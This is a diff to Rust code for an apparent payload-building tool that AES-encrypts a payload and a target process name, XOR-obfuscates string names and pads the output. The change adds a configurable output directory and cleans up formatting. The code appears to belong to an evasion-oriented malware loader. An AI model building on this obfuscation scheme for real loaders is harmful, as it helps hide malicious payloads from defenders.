@@ -19,6 +19,7 @@ struct XORString {
 }
 
 pub struct ResourceGenerator {
+    out_dir: String,
     aes_key: Vec<u8>,
     aes_key_offset: usize,
     aes_iv: Vec<u8>,
@@ -33,11 +34,11 @@ pub struct ResourceGenerator {
 }
 
 impl ResourceGenerator {
-    fn new() -> Self {
+    fn new(out_dir: String) -> Self {
         let aes_iv = generate_random_bytes(get_iv_len());
         let aes_key = generate_random_bytes(get_key_len());
 
-        let target =  if !TARGET_PROCESS.is_empty() {
+        let target = if !TARGET_PROCESS.is_empty() {
             aes_encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key, &aes_iv)
         } else {
             vec![]
@@ -71,7 +72,7 @@ impl ResourceGenerator {
             let key = generate_random_bytes(string_name.len());
             XORString {
                 string_name,
-                encrypted:xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
+                encrypted: xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
                 offset: usize::MAX,
                 key,
                 key_offset: usize::MAX,
@@ -79,6 +80,7 @@ impl ResourceGenerator {
         }).collect();
 
         ResourceGenerator {
+            out_dir,
             aes_key,
             aes_key_offset: usize::MAX,
             aes_iv,
@@ -94,7 +96,6 @@ impl ResourceGenerator {
     }
 
     fn build_resource_file(&mut self) {
-
         let mut functions: Vec<BuildFn> = vec![
             ResourceGenerator::add_aes_key_to_payload,
             ResourceGenerator::add_aes_iv_to_payload,
@@ -115,10 +116,7 @@ impl ResourceGenerator {
         let end_pad = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
         resource.extend(end_pad);
 
-        if !Path::new("rsrc/").is_dir() {
-            fs::create_dir("rsrc/").expect("Could not create directory");
-        }
-        fs::write(format!("rsrc/{}", RESOURCE_NAME), resource)
+        fs::write(format!("{}/{}", self.out_dir, RESOURCE_NAME), resource)
             .expect("Could not write payload file.");
     }
 
@@ -259,5 +257,9 @@ impl ResourceGenerator {
         }
 
         fs::write("src/consts.rs", consts.join("\n")).expect("Could not write consts file.");
+    }
+
+    pub fn get_out_dir(&self) -> &str {
+        &self.out_dir
     }
 }
